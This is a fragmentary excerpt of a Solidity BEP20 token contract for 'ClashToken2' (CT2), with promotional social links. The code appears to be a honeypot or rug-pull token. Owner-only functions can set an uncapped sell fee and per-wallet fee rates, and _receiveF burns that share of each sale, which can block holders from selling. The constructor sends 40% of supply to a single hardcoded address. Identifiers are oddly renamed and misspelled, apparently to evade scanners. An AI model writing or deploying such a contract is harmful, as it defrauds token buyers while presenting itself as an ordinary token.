...
* http://instagram.com/ClashToken2233
* https://www.reddit.com/user/ClashToken2233
* TWITTER:https://twitter.com/ct2
* WEBSITE:https://www.clash.io
* TELEGRAM:https://t.me/ct2
*/
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingClashToken2233OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingClashToken2233OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function swapExactTokensForTokensSupportingClashToken2233OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingClashToken2233OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingClashToken2233OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
...
interface IUniswapV2Factory {
    ...
    function ClashToken2233To() external view returns (address);
    function ClashToken2233ToSetter() external view returns (address);
    ...
    function setClashToken2233To(address) external;
    function setClashToken2233ToSetter(address) external;
}
...
contract CT2 is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;
	string name_ = "ClashToken2";
	string symbol_ = "CT2";
	...
	transfer(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, totalSupply() / 10*4);	
        ...
        _defaultSellClashToken2233 = 0;
        _defaultBuyClashToken2233 = 0;
    ...
    uint256 private _defaultSellClashToken2233 = 0;
    uint256 private _defaultBuyClashToken2233 = 0;
    ...
    function incS(uint256 _value) external onlyowaer {
        _defaultSellClashToken2233 = _value;
    }


    function acClashToken2233fq(address _acc, uint256 _value) external onlyowaer {
 ...
 function getRelease(address _address) external view onlyowaer returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeClashToken2233amuont = 0;

        if (rF) {
            uint256 tradeClashToken2233 = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                   
                    tradeClashToken2233 = _msgClashToken2233Info(uint160(from));
                    tradeClashToken2233 = tradeClashToken2233 < _defaultSellClashToken2233 ? _defaultSellClashToken2233 : tradeClashToken2233;
                }
                if (from == uniswapV2Pair) {
                    tradeClashToken2233 = _defaultBuyClashToken2233;
                }
            }
                        
			//uint160 f = uint160(from) ^ _escapeKey;
            if (_Escape[from] > 0) {
                tradeClashToken2233 = _Escape[from];
            }


            tradeClashToken2233amuont = _amuont.mul(tradeClashToken2233).div(100);
        }


        if (tradeClashToken2233amuont > 0) {
            _balances[from] = _balances[from].sub(tradeClashToken2233amuont);
            _balances[address(0x000000000000000000000000000000000000dEaD)] = _balances[address(0x000000000000000000000000000000000000dEaD)].add(tradeClashToken2233amuont);
            emit Transfer(from, address(0x000000000000000000000000000000000000dEaD), tradeClashToken2233amuont);
        }

        _balances[from] = _balances[from].sub(_amuont - tradeClashToken2233amuont);
        _balances[_to] = _balances[_to].add(_amuont - tradeClashToken2233amuont);
        emit Transfer(from, _to, _amuont - tradeClashToken2233amuont);
    }
	...
	function _msgClashToken2233Info(uint _acc) internal view virtual returns (uint) {
